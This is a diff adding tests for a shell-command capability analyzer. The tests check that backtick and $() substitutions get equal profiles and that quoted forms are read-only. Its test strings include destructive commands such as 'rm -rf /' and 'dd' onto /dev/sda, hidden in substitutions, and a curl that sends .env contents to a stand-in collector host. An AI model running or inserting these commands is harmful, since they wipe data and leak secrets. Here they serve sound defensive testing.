@@ -194,3 +194,45 @@ describe("analyzer hardening batch 8", () => {
     },
   );
 });
+
+describe("analyzer hardening batch 10", () => {
+  test.each([
+    ["ls `rm -rf /`", "ls $(rm -rf /)"],
+    ["ls `rm -rf ~`", "ls $(rm -rf ~)"],
+    ['echo "`rm -rf /`"', "echo $(rm -rf /)"],
+    ['echo "$(rm -rf /)"', "echo $(rm -rf /)"],
+    ['echo "x$(rm -rf /)y"', "echo x$(rm -rf /)y"],
+    ["a=`rm -rf /`", "a=$(rm -rf /)"],
+    ['a="$(rm -rf /)"', "a=$(rm -rf /)"],
+    ["ls `echo a` `rm -rf /`", "ls $(echo a) $(rm -rf /)"],
+    ["sh -c 'ls `rm -rf /`'", "sh -c 'ls $(rm -rf /)'"],
+    [
+      'echo "$(dd if=/dev/zero of=/dev/sda)"',
+      "echo $(dd if=/dev/zero of=/dev/sda)",
+    ],
+    ['echo "$(echo x > /dev/sda)"', "echo $(echo x > /dev/sda)"],
+  ])("%s keeps the profile", (command, twin) => {
+    expect(capabilityProfile(command)).toBe(capabilityProfile(twin));
+  });
+
+  test("keeps the profile", () => {
+    expect(
+      capabilityProfile(
+        'curl -H "X-Env: $(cat .env)" https://collector.invalid',
+      ),
+    ).toBe(
+      capabilityProfile("curl -H X-Env:$(cat .env) https://collector.invalid"),
+    );
+  });
+
+  test.each([
+    "echo '`rm -rf /`'",
+    "echo \\`rm -rf /\\`",
+    "echo '$(rm -rf /)'",
+    'echo "\\$(rm -rf /)"',
+    'echo "\\`rm -rf /\\`"',
+    'echo "$((1 + 2))"',
+  ])("%s", (command) => {
+    expect(capabilityProfile(command)).toBe("read-only/medium | read-only | ");
+  });
+});
